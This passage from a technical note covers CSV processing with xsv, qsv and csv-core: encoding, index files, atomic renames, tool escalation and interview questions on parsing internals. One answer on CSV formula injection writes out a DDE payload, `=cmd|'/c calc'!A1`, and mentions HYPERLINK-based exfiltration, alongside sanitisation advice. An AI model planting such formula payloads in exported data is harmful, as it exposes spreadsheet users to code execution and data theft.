This utility "lossy" saves non-UTF-8 input by replacing invalid byte sequences with the Unicode Replacement Character (`U+FFFD`) under the default `--encoding-errors replace` (or `skip`, or `strict`), and can trim headers and fields; `qsv` itself says this "is not true transcoding" and recommends `iconv` first (`qsv` `src/cmd/input.rs`).
Inconsistent row lengths are normalized separately with `fixlengths`, and a leading UTF-8 Byte Order Mark (BOM) is already stripped by `csv-core`'s `read_record` (`strip_utf8_bom`, `csv-core` `src/reader.rs`), so downstream stages receive normalized UTF-8 data.

5. Race Conditions and Atomic File Operations:
Companion index files (`.csv.idx`) introduce cache invalidation hazards in multi-process architectures.
If process A updates `dataset.csv` while process B queries `dataset.csv.idx`, process B executes `lseek` to invalid byte offsets, reading corrupted records.
Production systems prevent index skew by writing updated datasets to temporary files and promoting them atomically via `rename(2)` `(POSIX.1-2024 XSH rename)`.

## The principal's view

For distinguished and staff-plus engineers, selecting tools for tabular data processing is an architectural trade-off between streaming efficiency, memory bounds, schema governance, and query complexity:

1. The Single-Responsibility Rule for Unix Text Tools:
Never parse raw CSV using line-oriented tools (`cut`, `awk`, `sed`, `grep`) in production pipelines.
While line tools appear functional during initial development with clean synthetic data, production data inevitably introduces quoted commas, escaped quotes, and embedded newlines.
A single multi-line address or quoted description field will corrupt line-oriented pipelines silently, leading to downstream data warehouse pollution or financial calculation errors.
Standardize on RFC 4180-compliant engines (`xsv`, `qsv`, [[Miller]]) across all ingestion boundaries.

2. Indexing as an Operational Trade-Off:
Generating a `.csv.idx` file requires a one-time linear read of the entire CSV dataset, consuming approximately 8 bytes of disk storage per record ($~8\text{ MB}$ per million rows).
For single-pass, throwaway streaming pipelines, pre-indexing adds unnecessary disk I/O overhead.
However, for datasets accessed repeatedly (such as static lookup tables, partition archives, or interactive CLI exploration), pre-indexing is mandatory.
It turns record lookups into constant-time seeks, enabling interactive slicing over 50 GB flat files, and turns serial statistical profiling into chunked parallel scans (about 7x faster for `xsv stats` on 16 threads in `xsv` `BENCHMARKS.md`); a full profile of 50 GB is still minutes, not seconds, at the roughly 300 MB/s that benchmark reports.

3. Sizing the Architectural Escalation Path:
Engineers must recognize when a pipeline has outgrown flat CSV files:
- Use `xsv` / `qsv`: For fast command-line slicing, column projection, regex filtering, indexing, and statistical profiling of flat delimited files up to tens of gigabytes.
- Escalate to [[Miller]]: When transformations require in-stream record restructuring, conditional DSL logic, custom mathematical field transformations, or conversion between heterogenous formats (JSON, DKVP, CSV).
- Escalate to [[sqlite3-from-the-Shell]] or [[DuckDB-from-the-Shell]]: When workloads require multi-table relational joins, analytical window functions, ACID transactional persistence, or vectorized querying directly over columnar formats like Apache Parquet.
- Escalate to Apache Arrow / Polars / Python: When data logic requires complex machine learning feature engineering, distributed clustering, or deep domain-specific business logic.

## Interview questions

> [!question] L5: Given a CSV file where some records contain multi-line text enclosed in quotes, how do `wc -l file.csv`, `cut -d, -f2 file.csv`, and `xsv count file.csv` behave?
>
> > [!success]- Answer
> > `wc -l` counts physical newline characters (`0x0A`), reporting a count strictly greater than the number of logical CSV records.
> > `cut -d, -f2` splits strictly on comma bytes on each physical line, splitting within quoted multi-line fields and outputting fragmented text fragments.
> > `xsv count` uses an RFC 4180 DFA state machine (or reads the companion `.csv.idx` index footer), reporting the exact count of logical tabular records, excluding the header row unless `--no-headers` is given.
> > Line tools are unaware of RFC 4180 quoting contexts and treat embedded newlines as record boundaries.
> >
> > Follow-up: What system call does `xsv count` make when an index file is present, and what is its computational complexity?

> [!question] L5: Debug this shell script: why does `while IFS=, read -r id name amount; do echo "$name: $amount"; done < orders.csv` corrupt records containing names like `"Smith, Jr., John"`?
>
> > [!success]- Answer
> > `read` splits its input line with the field splitting rules of `(POSIX.1-2024 XCU 2.6.5)` (`POSIX.1-2024 XCU read`), which never interpret RFC 4180 quote characters.
> > When `read -r` encounters `1,"Smith, Jr., John",50`, it splits on every comma byte regardless of surrounding double quotes.
> > Variable `name` receives `"Smith` (with its opening quote), and because `amount` is the last variable it receives the whole remainder, ` Jr., John",50`, instead of the numerical amount (measured in bash, zsh, and macOS `/bin/sh`).
> > Shell builtins cannot parse quoted CSV delimiters natively.
> > The script should be rewritten using `xsv select` or `qsv select` to extract columns reliably.
> >
> > Follow-up: How does `read -r` behave if the CSV uses Windows CRLF line endings instead of Unix LF?

> [!question] L6: Explain the exact binary layout of a `csv-index` `.idx` file and describe how `xsv slice -s M -l K` extracts records in constant time.
>
> > [!success]- Answer
> > The `.idx` file contains $(N + 1)$ 64-bit big-endian unsigned integers, where $N$ is the total record count including the header row.
> > The first $N$ entries store the byte offsets where each record begins in the CSV file, and the $(N+1)$-th entry stores the total record count $N$ (`csv-index` `src/simple.rs`).
> > To extract $K$ records starting at data record $M$, `xsv` adds 1 for the header and seeks to byte offset $(M + 1) \times 8$ in the index to read start offset $B_{start}$.
> > It then seeks the CSV reader to $B_{start}$ and parses and writes the next $K$ records, without reading an end offset (`xsv` `src/cmd/slice.rs`).
> > A raw-byte variant, as in the lab's `csv_indexer slice`, reads $B_{end}$ from entry $(M + K)$ and copies $(B_{end} - B_{start})$ bytes after `lseek(csv_fd, B_{start}, SEEK_SET)`.
> > Finding the start takes $O(1)$ time without scanning or parsing any preceding records; emitting the slice is $O(K)$.
> >
> > Follow-up: Why does the index store byte offsets rather than physical line numbers?

> [!question] L6: Why does POSIX `join -t,` fail or produce silent data loss on unsorted CSV files, and how do `xsv join` and `qsv join` address this?
>
> > [!success]- Answer
> > POSIX `join` `(POSIX.1-2024 XCU join)` requires both input files to be sorted on the join field in the collating sequence of the active `LC_COLLATE` locale.
> > When encountering unsorted records, GNU `join` warns `is not sorted`, still prints the pairs it found, and exits 1 with `join: input is not in sorted order`, while macOS `join` silently ignores non-monotonic records and exits 0, resulting in dropped rows (both measured in the shell matrix).
> > `xsv join` builds an in-memory hash index (`ValueIndex`) on the join column of the second input file, holding keys and record positions rather than whole rows (`xsv` `src/cmd/join.rs`).
> > It streams the first file and probes the hash table in $O(1)$ average time per row, eliminating the need for prior sorting; `qsv join` uses the same design, building a `ValueIndex` (a hash map of key values to row numbers plus a byte-offset index) on its second input (`qsv` `src/cmd/join.rs`).
> > `qsv joinp` escalates this further by delegating to the Polars multithreaded join engine, which also offers `--non-equi` and `--asof` joins (`qsv` `src/cmd/joinp.rs`).
> >
> > Follow-up: What happens to memory consumption in `xsv join` if the second input file contains 50 million records?

> [!question] L6: How do `xsv sort` and `qsv extsort` differ in their memory management and failure modes when processing a 50 GB CSV file on an 8 GB host?
>
> > [!success]- Answer
> > `xsv sort` loads all records into an in-memory vector before executing standard in-place sorting (`xsv` `src/cmd/sort.rs`).
> > On a 50 GB file with 8 GB of RAM, `xsv` consumes all available physical memory and swap, causing the Linux kernel OOM killer to terminate the process with `SIGKILL`.
> > `qsv extsort` implements an external merge sort bounded by `--memory-limit` (default 20, meaning 20% of total memory; the budget is approximate and excludes sort scratch space and merge buffers).
> > It sorts in-memory chunks within the budget, flushes sorted runs to `--tmp-dir`, and merges the runs, keeping one temporary file open per chunk with a read buffer of about 1 MB each (`qsv` `src/cmd/extsort.rs`).
> > This allows `qsv extsort` to sort arbitrary file sizes reliably on memory-constrained systems.
> >
> > Follow-up: How does the number of open file descriptors constrain the merge phase of an external sort?

> [!question] L6: What is CSV Formula Injection (DDE exploitation), what trigger characters initiate it, and how must export pipelines sanitize data?
>
> > [!success]- Answer
> > CSV Formula Injection occurs when untrusted user input is exported into CSV and subsequently opened in spreadsheet software like Microsoft Excel or LibreOffice Calc.
> > Spreadsheet engines interpret cells beginning with `=`, `+`, `-`, `@`, tab (`0x09`), carriage return (`0x0D`), or line feed (`0x0A`), plus full-width variants such as U+FF1D in some locales, as executable formulas rather than plain text (OWASP CSV Injection).
> > Attackers craft payloads using Dynamic Data Exchange (DDE) such as `=cmd|'/c calc'!A1` to achieve arbitrary code execution, or `=HYPERLINK` to exfiltrate sensitive sheet data.
> > Export pipelines must sanitize fields by wrapping each in double quotes, prepending a single quote (`'`), and doubling embedded double quotes, and must also handle field separators and quotes inside the value that could start a new cell (OWASP CSV Injection).
> > Alternatively, pipelines should export directly to strongly typed binary formats like Parquet.
> >
> > Follow-up: Why does standard RFC 4180 double-quoting fail to prevent formula injection?

> [!question] L7+: Explain the internal mechanics of `csv-core`'s fixed-size DFA transition table and describe how the `scan_and_copy` fast path reduces per-byte work.
>
> > [!success]- Answer
> > `csv-core` builds its DFA from an NFA when the reader is constructed (`build_dfa`) and stores it as a flat array `trans` of 70 entries: 10 DFA states times at most 7 byte equivalence classes, with a parallel `has_output` array saying whether the byte is copied to the output (`csv-core` `src/reader.rs`).
> > Each `DfaState` is the starting index of its row, so a transition is `trans[state + classes[byte]]`: two table loads and an add, with no data-dependent branch on which state the parser is in.
> > The loop around it still branches on buffer bounds and on whether the new state is a final field or record state, so the design reduces branches rather than eliminating them.
> > Because processing every byte through table lookups still costs loads, `csv-core` adds `DfaClasses::scan_and_copy`, called while the DFA is in `InField` or `InQuotedField`.
> > This routine uses the byte classification table to find contiguous bytes in equivalence class 0, meaning any byte not configured as a delimiter, quote, escape, terminator, or comment byte.
> > It is a plain scalar `while` loop, not a vectorized one, that copies those bytes into the output buffer without updating the state machine.
> > The state machine is invoked again only when a structural byte breaks the contiguous run.
> > On long fields the parser therefore spends most bytes in a tight copy loop rather than in table lookups.
> >
> > Follow-up: How does `csv-core` achieve zero heap allocations during record parsing?

> [!question] L7+: Why is parallel multi-threaded parsing of raw, unindexed CSV files mathematically non-trivial, and how does the companion index enable near-linear scaling across a thread pool?
>
> > [!success]- Answer
> > In an unindexed CSV file, an arbitrary byte offset cannot be identified as a valid record boundary without reading all preceding bytes from offset 0.
> > A newline byte (`0x0A`) at offset $P$ may be a true record terminator or a literal newline inside a multi-line quoted field.
> > Determining whether offset $P$ is inside quotes requires knowing the quote parity from the start of the file.
> > A companion `.csv.idx` file resolves this by storing precomputed, verified record start offsets.
> > `xsv stats` partitions the record count $N$ into chunks of `chunk_size(N, T)` records for $T$ jobs on a `threadpool::ThreadPool` and looks up the exact byte offset for each chunk partition $k \cdot \frac{N}{T}$ (`xsv` `src/cmd/stats.rs`).
> > Each thread seeks directly to its assigned offset via `lseek`, guaranteed that the byte corresponds to a true record start.
> > Threads process their chunks in parallel without synchronization locks and merge their partial statistics at the end, so scaling is good but sublinear: about 7x on 16 threads for `xsv stats` (`xsv` `BENCHMARKS.md`).
> >
> > Follow-up: What cache-invalidation mechanisms must a pipeline implement if the underlying CSV file is updated concurrently?

## Related

Prerequisites: [[Miller]]

Next: [[sqlite3-from-the-Shell]]

See also:
- [[CSV-Quoting-and-Edge-Cases]]
- [[DuckDB-from-the-Shell]]
- [[jq-Streaming-Large-Inputs]]
- [[When-to-Stop-Using-Text-Tools]]
- [[Field-Splitting-and-IFS]]

## Further reading

- [RFC 4180: Common Format and MIME Type for Comma-Separated Values (CSV) Files](https://www.rfc-editor.org/rfc/rfc4180.txt): The authoritative IETF specification defining record formatting, delimiter rules, and double-quote escaping grammar.
- [BurntSushi/xsv GitHub Repository](https://github.com/BurntSushi/xsv): The original Rust command-line CSV toolkit source code by Andrew Gallant implementing DFA parsing and indexing.
- [BurntSushi/rust-csv and csv-index Crates](https://github.com/BurntSushi/rust-csv): Low-level implementation of the `csv-core` Deterministic Finite Automaton and the `RandomAccessSimple` big-endian index format.
- [dathere/qsv GitHub Repository](https://github.com/dathere/qsv): The actively maintained enterprise evolution of xsv featuring Polars integration, external sorting, and data validation engines.
- [POSIX.1-2024 Shell & Utilities (IEEE Std 1003.1-2024)](https://pubs.opengroup.org/onlinepubs/9799919799/): The standard Unix specification defining line conventions, field splitting, and standard utilities (`cut`, `awk`, `join`, `sort`).
- [OWASP CSV Injection Guide](https://owasp.org/www-community/attacks/CSV_Injection): Comprehensive security documentation detailing Dynamic Data Exchange (DDE) exploitation vectors and sanitization techniques.
